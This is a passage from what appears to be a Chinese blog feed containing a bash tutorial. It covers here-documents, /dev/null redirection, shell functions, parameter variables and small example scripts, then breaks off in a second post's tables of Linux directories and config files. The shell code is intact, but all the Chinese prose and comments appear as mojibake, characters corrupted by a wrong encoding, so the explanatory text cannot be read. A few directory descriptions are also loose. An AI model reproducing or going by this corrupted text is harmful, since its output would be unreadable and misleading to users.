<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">wc</span> -l &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">    æ¬¢è¿æ¥åˆ°</span></span><br><span class="line"><span class="string">    èœé¸Ÿæ•™ç¨‹</span></span><br><span class="line"><span class="string">    www.runoob.com</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">3          <span class="comment"># è¾“å‡ºç»“æœä¸º 3 è¡Œ</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h3 id="dev-null-æ–‡ä»¶">/dev/null æ–‡ä»¶</h3>
<p>å¦‚æœå¸Œæœ›æ‰§è¡ŒæŸä¸ªå‘½ä»¤ï¼Œä½†åˆä¸å¸Œæœ›åœ¨å±å¹•ä¸Šæ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œé‚£ä¹ˆå¯ä»¥å°†è¾“å‡ºé‡å®šå‘åˆ° /dev/nullï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; /dev/null</span><br></pre></td></tr></table></figure>
<p>/dev/null æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå†™å…¥åˆ°å®ƒçš„å†…å®¹éƒ½ä¼šè¢«ä¸¢å¼ƒï¼›å¦‚æœå°è¯•ä»è¯¥æ–‡ä»¶è¯»å–å†…å®¹ï¼Œé‚£ä¹ˆä»€ä¹ˆä¹Ÿè¯»ä¸åˆ°ã€‚ä½†æ˜¯ /dev/null æ–‡ä»¶éå¸¸æœ‰ç”¨ï¼Œå°†å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°å®ƒï¼Œä¼šèµ·åˆ°&quot;ç¦æ­¢è¾“å‡º&quot;çš„æ•ˆæœã€‚</p>
<p>å¦‚æœå¸Œæœ›å±è”½ stdout å’Œ stderrï¼Œå¯ä»¥è¿™æ ·å†™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">command</span> &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>0 æ˜¯æ ‡å‡†è¾“å…¥ï¼ˆSTDINï¼‰ï¼Œ1 æ˜¯æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰ï¼Œ2 æ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆSTDERRï¼‰ã€‚</p>
<h2 id="Shell-å‡½æ•°">Shell å‡½æ•°</h2>
<p>ä¸å¾ˆå¤šå…¶ä»–è¯­è¨€ä¸åŒï¼Œæ‰€æœ‰å‡½æ•°åœ¨ä½¿ç”¨å‰å¿…é¡»å®šä¹‰ã€‚è¿™æ„å‘³ç€å¿…é¡»å°†å‡½æ•°æ”¾åœ¨è„šæœ¬å¼€å§‹éƒ¨åˆ†ï¼Œç›´è‡³shellè§£é‡Šå™¨é¦–æ¬¡å‘ç°å®ƒæ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨ã€‚è°ƒç”¨å‡½æ•°ä»…ä½¿ç”¨å…¶å‡½æ•°åå³å¯ã€‚</p>
<p><strong>shellä¸­å‡½æ•°çš„å®šä¹‰æ ¼å¼å¦‚ä¸‹ï¼š</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ <span class="keyword">function</span> ] funname [()]</span><br><span class="line">&#123;</span><br><span class="line">    action;</span><br><span class="line">    [<span class="built_in">return</span> n;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯´æ˜ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1ã€å¯ä»¥å¸¦function fun() å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ç›´æ¥fun() å®šä¹‰ï¼ˆæ¨èï¼‰ï¼Œä¸å¸¦ä»»ä½•å‚æ•°ã€‚</p>
</li>
<li class="lvl-2">
<p>2ã€å‚æ•°è¿”å›ï¼Œå¯ä»¥æ˜¾ç¤ºåŠ ï¼šreturn è¿”å›ï¼Œå¦‚æœä¸åŠ ï¼Œå°†ä»¥æœ€åä¸€æ¡å‘½ä»¤è¿è¡Œç»“æœï¼Œä½œä¸ºè¿”å›å€¼ã€‚ returnåè·Ÿæ•°å€¼n(0-255)</p>
</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithReturn</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;è¿™ä¸ªå‡½æ•°ä¼šå¯¹è¾“å…¥çš„ä¸¤ä¸ªæ•°å­—è¿›è¡Œç›¸åŠ è¿ç®—...&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;è¾“å…¥ç¬¬ä¸€ä¸ªæ•°å­—: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;è¾“å…¥ç¬¬äºŒä¸ªæ•°å­—: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> anotherNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ä¸¤ä¸ªæ•°å­—åˆ†åˆ«ä¸º <span class="variable">$aNum</span> å’Œ <span class="variable">$anotherNum</span> !&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $((<span class="variable">$aNum</span>+<span class="variable">$anotherNum</span>))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;è¾“å…¥çš„ä¸¤ä¸ªæ•°å­—ä¹‹å’Œä¸º $? !&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œç»“æœ</span></span><br><span class="line">è¿™ä¸ªå‡½æ•°ä¼šå¯¹è¾“å…¥çš„ä¸¤ä¸ªæ•°å­—è¿›è¡Œç›¸åŠ è¿ç®—...</span><br><span class="line">è¾“å…¥ç¬¬ä¸€ä¸ªæ•°å­—: </span><br><span class="line">1</span><br><span class="line">è¾“å…¥ç¬¬äºŒä¸ªæ•°å­—: </span><br><span class="line">2</span><br><span class="line">ä¸¤ä¸ªæ•°å­—åˆ†åˆ«ä¸º 1 å’Œ 2 !</span><br><span class="line">è¾“å…¥çš„ä¸¤ä¸ªæ•°å­—ä¹‹å’Œä¸º 3 !</span><br></pre></td></tr></table></figure>
<p>å‡½æ•°è¿”å›å€¼åœ¨è°ƒç”¨è¯¥å‡½æ•°åå¯é€šè¿‡ $? æ¥è·å¾—ã€‚</p>
<p><strong>Shellå‡½æ•°è„šæœ¬æ–‡ä»¶å®ç°ä¼ å‚åŠŸèƒ½</strong></p>
<p><strong>ä¼ å‚æ–¹å¼ä¸€ï¼š</strong></p>
<p>åœ¨Shellä¸­ï¼Œè°ƒç”¨å‡½æ•°æ—¶å¯ä»¥å‘å…¶ä¼ é€’å‚æ•°ã€‚åœ¨å‡½æ•°ä½“å†…éƒ¨ï¼Œé€šè¿‡ <code>$n</code> çš„å½¢å¼æ¥è·å–å‚æ•°çš„å€¼ï¼Œå½“n&gt;=10æ—¶ï¼Œéœ€è¦ä½¿ç”¨<code>$&#123;n&#125;</code>æ¥è·å–å‚æ•°ã€‚</p>
<p>å¸¦å‚æ•°çš„å‡½æ•°ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithParam</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸º <span class="variable">$1</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬äºŒä¸ªå‚æ•°ä¸º <span class="variable">$2</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬åä¸ªå‚æ•°ä¸º <span class="variable">$10</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬åä¸ªå‚æ•°ä¸º <span class="variable">$&#123;10&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬åä¸€ä¸ªå‚æ•°ä¸º <span class="variable">$&#123;11&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;å‚æ•°æ€»æ•°æœ‰ <span class="variable">$#</span> ä¸ª!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° $* !&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿è¡Œè¾“å‡ºç»“æœï¼š</span></span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 1 !</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ä¸º 2 !</span><br><span class="line">ç¬¬åä¸ªå‚æ•°ä¸º 10 !</span><br><span class="line">ç¬¬åä¸ªå‚æ•°ä¸º 34 !</span><br><span class="line">ç¬¬åä¸€ä¸ªå‚æ•°ä¸º 73 !</span><br><span class="line">å‚æ•°æ€»æ•°æœ‰ 11 ä¸ª!</span><br><span class="line">ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° 1 2 3 4 5 6 7 8 9 34 73 !</span><br></pre></td></tr></table></figure>
<p><strong>ä¼ å‚æ–¹å¼äºŒï¼š</strong></p>
<p>å¯ä»¥åœ¨è°ƒç”¨æ—¶ä¼ å‚ï¼Œä½†æ˜¯è„šæœ¬æ ¼å¼ä¸èƒ½çœç•¥ï¼Œç”¨å˜é‡ä»£æ›¿ã€‚å¦‚æœæ˜¯å¤šä¸ªå˜é‡å¯ä»¥ç”¨<code>$*</code>ä»£æ›¿</p>
<p>è„šæœ¬æ‰§è¡Œæ•ˆæœæ¼”ç¤ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithParam</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸º <span class="variable">$1</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬äºŒä¸ªå‚æ•°ä¸º <span class="variable">$2</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬åä¸ªå‚æ•°ä¸º <span class="variable">$10</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬åä¸ªå‚æ•°ä¸º <span class="variable">$&#123;10&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ç¬¬åä¸€ä¸ªå‚æ•°ä¸º <span class="variable">$&#123;11&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;å‚æ•°æ€»æ•°æœ‰ <span class="variable">$#</span> ä¸ª!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° $* !&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">funWithParam $*   <span class="comment"># æˆ–è€…ï¼šfunWithParam $1......$11</span></span><br><span class="line"></span><br><span class="line">[17:35:40 root@centon7 ~]# sh 1.sh 1 2 3 4 5 6 7 8 9 10 11</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 1 !</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ä¸º 2 !</span><br><span class="line">ç¬¬åä¸ªå‚æ•°ä¸º 10 !</span><br><span class="line">ç¬¬åä¸ªå‚æ•°ä¸º 10 !</span><br><span class="line">ç¬¬åä¸€ä¸ªå‚æ•°ä¸º 11 !</span><br><span class="line">å‚æ•°æ€»æ•°æœ‰ 11 ä¸ª!</span><br><span class="line">ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæ‰€æœ‰å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 !</span><br></pre></td></tr></table></figure>
<br>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸»å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‰§è¡Œçš„å‡½æ•°  --ä¸»å‡½æ•° å…ˆæ‰§è¡Œ è°ƒç”¨å…¶ä»–å‡½æ•°</span></span><br><span class="line">main()&#123;</span><br><span class="line">  judge <span class="variable">$</span>*</span><br><span class="line">  <span class="built_in">compare</span> <span class="variable">$</span>*</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨ä¸»å‡½æ•°æ‰§è¡Œ</span></span><br><span class="line">main <span class="variable">$</span>*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦å¤–ï¼Œè¿˜æœ‰å‡ ä¸ªç‰¹æ®Šå­—ç¬¦ç”¨æ¥å¤„ç†å‚æ•°ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°å¤„ç†</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>$#</td>
<td>ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°</td>
</tr>
<tr>
<td>$*</td>
<td>ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°</td>
</tr>
<tr>
<td>$$</td>
<td>è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·</td>
</tr>
<tr>
<td>$!</td>
<td>åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„IDå·</td>
</tr>
<tr>
<td>$@</td>
<td>ä¸$*ç›¸åŒï¼Œä½†æ˜¯ä½¿ç”¨æ—¶åŠ å¼•å·ï¼Œå¹¶åœ¨å¼•å·ä¸­è¿”å›æ¯ä¸ªå‚æ•°ã€‚</td>
</tr>
<tr>
<td>$-</td>
<td>æ˜¾ç¤ºShellä½¿ç”¨çš„å½“å‰é€‰é¡¹ï¼Œä¸setå‘½ä»¤åŠŸèƒ½ç›¸åŒã€‚</td>
</tr>
<tr>
<td>$?</td>
<td>æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯ã€‚</td>
</tr>
</tbody>
</table>
<p>é…ç½®å‡½æ•°ä¿¡æ¯çš„æ–‡ä»¶ï¼š/etc/init.d/functions ã€‚ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">.  /etc/init.d/functions</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼š&quot;</span> num</span><br><span class="line"><span class="keyword">if</span>  [ <span class="variable">$num</span> -eq 10 ]</span><br><span class="line"> <span class="keyword">then</span></span><br><span class="line"> action <span class="string">&quot;è¾“å…¥ä¿¡æ¯æ­£ç¡®&quot;</span> /bin/true</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> action <span class="string">&quot;è¾“å…¥ä¿¡æ¯é”™è¯¯&quot;</span> /bin/false</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/63063238//image-20250717172053299.png" alt="image-20250717172053299"></p>
<h3 id="å®ä¾‹">å®ä¾‹</h3>
<h3 id="æ¨è¾‰ä¸‰è§’ï¼š">æ¨è¾‰ä¸‰è§’ï¼š</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">test</span> -z <span class="variable">$1</span>) ;<span class="keyword">then</span> </span><br><span class="line"> <span class="built_in">read</span> -p <span class="string">&quot;Input high Int Lines:&quot;</span> high </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"> high=<span class="variable">$1</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">test</span> -z <span class="variable">$2</span>) ;<span class="keyword">then</span> </span><br><span class="line"> space=4</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"> space=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">printspace</span></span>()&#123;</span><br><span class="line">  <span class="comment">#ç©ºä½å¡«å……</span></span><br><span class="line">  <span class="keyword">for</span>((z=<span class="number">1</span>;z&lt;=<span class="variable">$1</span>;z++));<span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot; &quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a[0]=1     </span><br><span class="line"><span class="keyword">for</span>((i=<span class="number">0</span>;i&lt;=high;i++));<span class="keyword">do</span></span><br><span class="line">  <span class="comment">#äº§ç”Ÿå½“å‰åˆ—æ•°æ®æ•°ç»„</span></span><br><span class="line">  <span class="keyword">for</span> ((j=<span class="variable">$i</span>;j&gt;<span class="number">0</span>;j--));<span class="keyword">do</span> </span><br><span class="line">    ((a[<span class="variable">$j</span>]+=a[<span class="variable">$j</span>-<span class="number">1</span>])) </span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  printspace $(((<span class="variable">$high</span>-<span class="variable">$i</span>)*<span class="variable">$space</span>/<span class="number">2</span>))</span><br><span class="line">  <span class="keyword">for</span> ((j=<span class="number">0</span>;j&lt;=<span class="variable">$i</span>;j++));<span class="keyword">do</span></span><br><span class="line">    num=$((<span class="variable">$space</span>-<span class="variable">$&#123;#a[$j]&#125;</span>))</span><br><span class="line">    printspace $((<span class="variable">$num</span>/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">echo</span> -n <span class="variable">$&#123;a[$j]&#125;</span></span><br><span class="line">    printspace $((<span class="variable">$num</span>-<span class="variable">$num</span>/<span class="number">2</span>))</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h3 id="sum-max">sum()&amp;max():</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;shellçš„å‡½æ•°è¿”å›å€¼åªèƒ½ä¸º0~255çš„æ•´æ•°ï¼Œé«˜ä½è‡ªåŠ¨ä¸¢å¼ƒ&quot;</span></span><br><span class="line"><span class="function"><span class="title">sum</span></span>()&#123;</span><br><span class="line"> <span class="built_in">sum</span>=0</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$i</span> -ne <span class="variable">$1</span>;<span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> -n <span class="string">&quot;+&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="built_in">sum</span>=$((<span class="variable">$sum</span>+<span class="variable">$i</span>))</span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;=<span class="variable">$sum</span>&quot;</span></span><br><span class="line"> <span class="built_in">return</span> $((<span class="variable">$sum</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sum</span> <span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;â€˜sum()â€™å‡½æ•°è¿”å›å€¼ï¼š&quot;</span>$?</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">max</span></span>()&#123;</span><br><span class="line"> max=0</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>;<span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$i</span> -ge <span class="variable">$max</span>;<span class="keyword">then</span></span><br><span class="line">    max=<span class="variable">$i</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;å‚æ•°æœ€å¤§å€¼ï¼š<span class="variable">$max</span>&quot;</span></span><br><span class="line"> <span class="built_in">return</span> $((<span class="variable">$max</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">max <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;â€˜max()â€™å‡½æ•°è¿”å›å€¼ï¼š&quot;</span>$?</span><br></pre></td></tr></table></figure>
<h3 id="99ä¹˜æ³•è¡¨ï¼š">99ä¹˜æ³•è¡¨ï¼š</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..9&#125;;<span class="keyword">do</span></span><br><span class="line"> <span class="keyword">for</span>((j=<span class="number">1</span>;j&lt;=i;j++));<span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="subst">$(($i*$j)</span>)\t&quot;</span></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..9&#125;;<span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> &#123;0..9&#125;;<span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> &#123;0..9&#125;;<span class="keyword">do</span></span><br><span class="line">            number1=$((a*<span class="number">100</span>+b*<span class="number">10</span>+c))</span><br><span class="line">            number2=$((a**<span class="number">3</span>+b**<span class="number">3</span>+c**<span class="number">3</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$number1</span> -eq <span class="variable">$number2</span>; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Found number <span class="variable">$number1</span>&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘Linuxæ€»ç»“ï¼ˆå¾…å®Œå–„ï¼‰</title>
    <url>/posts/2c8b313c/</url>
    <content><![CDATA[<h2 id="æ–‡ä»¶ç³»ç»Ÿä»‹ç»">æ–‡ä»¶ç³»ç»Ÿä»‹ç»</h2>
<h3 id="æ ¹ç›®å½•ç»“æ„åŠå…¶åŠŸèƒ½">æ ¹ç›®å½•ç»“æ„åŠå…¶åŠŸèƒ½</h3>
<p><strong>ç³»ç»Ÿç›®å½•ç»“æ„ï¼š</strong></p>
<table>
<thead>
<tr>
<th>ç›®å½•</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>bin</strong></td>
<td><strong>ç›®å½•å…¨ç§°(binary) å­˜æ”¾äºŒè¿›åˆ¶å‘½ä»¤æ–‡ä»¶(æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨)</strong></td>
</tr>
<tr>
<td>sbin</td>
<td>ç›®å½•å­˜æ”¾äºŒè¿›åˆ¶å‘½ä»¤æ–‡ä»¶(rootç”¨æˆ·å¯ä»¥ä½¿ç”¨)</td>
</tr>
<tr>
<td><strong>etc</strong></td>
<td><strong>ç›®å½•å­˜æ”¾è½¯ä»¶ç¨‹åºæˆ–ç³»ç»Ÿç¨‹åºé…ç½®æ–‡ä»¶</strong></td>
</tr>
<tr>
<td>lib</td>
<td>ç›®å½•ä¼šå­˜æ”¾éœ€è¦è°ƒå–åº“æ–‡ä»¶ä¿¡æ¯ æ—§è½¯ä»¶ç¨‹åºè°ƒå–åº“æ–‡ä»¶</td>
</tr>
<tr>
<td>lib64</td>
<td>ç›®å½•ä¼šå­˜æ”¾éœ€è¦è°ƒå–åº“æ–‡ä»¶ä¿¡æ¯ æ–°è½¯ä»¶ç¨‹åºè°ƒå–åº“æ–‡ä»¶</td>
</tr>
<tr>
<td>media</td>
<td>å¯ä»¥å­˜æ”¾å®ä¾‹è§†é¢‘æˆ–å›¾ç‰‡ å¯ä»¥ç”¨äºä½œä¸ºé»˜è®¤æŒ‚è½½ç‚¹</td>
</tr>
<tr>
<td>mnt</td>
<td>å¯ä»¥ç”¨äºä½œä¸ºé»˜è®¤æŒ‚è½½ç‚¹</td>
</tr>
<tr>
<td>opt</td>
<td>ç›®å½•å­˜æ”¾ç¬¬ä¸‰æ–¹è½¯ä»¶ç¨‹åºæ•°æ® ç­‰ä»·äºWindows program files</td>
</tr>
<tr>
<td>usr</td>
<td>ç›®å½•å­˜æ”¾ç¬¬ä¸‰æ–¹è½¯ä»¶ç¨‹åºæ•°æ® ç­‰ä»·äºWindows program files</td>
</tr>
<tr>
<td><strong>root</strong></td>
<td><strong>ç”¨æˆ·ä¿¡æ¯å­˜æ”¾å®¶ç›®å½• rootç”¨æˆ·çš„å®¶ ~</strong></td>
</tr>
<tr>
<td>home</td>
<td>ç”¨æˆ·ä¿¡æ¯å­˜æ”¾å®¶ç›®å½• æ™®é€šç”¨æˆ·çš„å®¶~</td>
</tr>
<tr>
<td>boot</td>
<td>ç›®å½•å­˜æ”¾ç³»ç»Ÿå¯åŠ¨ç›¸å…³çš„æ•°æ®</td>
</tr>
<tr>
<td><strong>dev</strong></td>
<td><strong>ç›®å½•ä¼šå­˜æ”¾ä¸€äº›è®¾å¤‡æ–‡ä»¶ä¿¡æ¯</strong></td>
</tr>
<tr>
<td><strong>var</strong></td>
<td><strong>ç›®å½•å…¨ç§°(variable),ç”¨äºå­˜æ”¾æ—¥å¿—æ–‡ä»¶çš„</strong></td>
</tr>
<tr>
<td>tmp</td>
<td>ç›®å½•ç”¨äºä¸´æ—¶å­˜æ”¾æ–‡ä»¶ä¿¡æ¯ ç±»ä¼¼äºWindows å›æ”¶ç«™</td>
</tr>
<tr>
<td><strong>proc</strong></td>
<td><strong>ç”±å†…æ ¸ç»„æˆï¼Œç›®å½•ä¸­ä¼šå­˜æ”¾ç³»ç»Ÿå†…æ ¸é…ç½®ä¿¡æ¯æˆ–æœåŠ¡è¿›ç¨‹ä¿¡æ¯ï¼Œä¸ä¼šå ç”¨ç£ç›˜ç©ºé—´ï¼Œåªä¼šå ç”¨å†…å­˜ç©ºé—´</strong></td>
</tr>
</tbody>
</table>
<h3 id="ç³»ç»Ÿé…ç½®ä¿¡æ¯">ç³»ç»Ÿé…ç½®ä¿¡æ¯</h3>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>è·¯å¾„</th>
</tr>
</thead>
<tbody>
<tr>
<td>ç½‘å¡é…ç½®ï¼ˆcentosï¼‰</td>
<td>/etc/sysconfig/network-scripts/ifcfg-ens33<br>/etc/sysconfig/network-scripts/ifcfg-eth0</td>
</tr>
<tr>
<td>ç½‘å¡é…ç½®ï¼ˆkaliï¼‰</td>
<td>/etc/systemd/networkd.conf</td>
</tr>
<tr>
<td>ä¸»æœºå</td>
<td>/etc/hostname</td>
</tr>
<tr>
<td>åŸŸåé…ç½®æ–‡ä»¶</td>
<td>/etc/resolv.conf</td>
</tr>
<tr>
<td>ç¯å¢ƒå˜é‡</td>
<td>/etc/profile<br>/etc/bashrc<br>~/.bash_profile <br>~/.bashrc</td>
</tr>
<tr>
<td>å¼€æœºè‡ªåŠ¨åŠ è½½å‘½ä»¤æ–‡ä»¶</td>
<td>/etc/rc.d/rc.local</td>
</tr>
<tr>
<td>ç”¨æˆ·ç™»å½•ä¿¡æ¯æç¤ºæ–‡ä»¶</td>
<td>/etc/motd</td>
</tr>
<tr>
<td>ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯</td>
<td>/etc/[redhat/centos/os(kaliæ˜¯os)]-release</td>
</tr>
<tr>
<td>ç”¨æˆ·ç›¸å…³æ–‡ä»¶ä¿¡æ¯</td>
<td>/etc/passwd</td>
</tr>
<tr>
<td>cpuç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬å‹å·ã€ä¸»é¢‘ã€å†…æ ¸ä¿¡æ¯ç­‰</td>
<td>/proc/cpuinfo</td>
</tr>
<tr>
